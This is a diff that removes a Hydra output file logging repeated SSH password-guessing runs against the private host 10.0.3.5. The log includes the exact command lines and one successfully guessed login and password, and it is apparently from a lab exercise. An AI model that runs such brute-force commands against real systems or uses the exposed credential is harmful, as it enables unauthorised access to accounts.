@@ -1,8 +1,0 @@
-# Hydra v9.2 run at 2026-05-13 21:36:47 on 10.0.3.5 ssh (hydra -L usuarios.txt -p 123 -t 5 -w 1 -v -o resultado_123.txt ssh://10.0.3.5)
-# Hydra v9.2 run at 2026-05-13 21:37:15 on 10.0.3.5 ssh (hydra -L usuarios.txt -p 123 -t 5 -w 2 -v -o resultado_123.txt ssh://10.0.3.5)
-[22][ssh] host: 10.0.3.5   login: nmacgarry   password: 123
-# Hydra v9.2 run at 2026-05-13 21:38:45 on 10.0.3.5 ssh (hydra -L usuarios.txt -p 123 -t 5 -w 1 -v -o resultado_123.txt ssh://10.0.3.5)
-# Hydra v9.2 run at 2026-05-13 21:39:10 on 10.0.3.5 ssh (hydra -L usuarios.txt -p 123 -t 4 -w 1 -v -o resultado_123.txt ssh://10.0.3.5)
-# Hydra v9.2 run at 2026-05-13 21:39:41 on 10.0.3.5 ssh (hydra -L usuarios.txt -p 123 -t 6 -w 2 -v -o resultado_123.txt ssh://10.0.3.5)
-# Hydra v9.2 run at 2026-05-13 21:40:10 on 10.0.3.5 ssh (hydra -L usuarios.txt -p 321 -t 5 -w 2 -v -o resultado_123.txt ssh://10.0.3.5)
-# Hydra v9.2 run at 2026-05-13 21:40:49 on 10.0.3.5 ssh (hydra -L usuarios.txt -p 321 -t 4 -w 2 -v -o resultado_123.txt ssh://10.0.3.5)
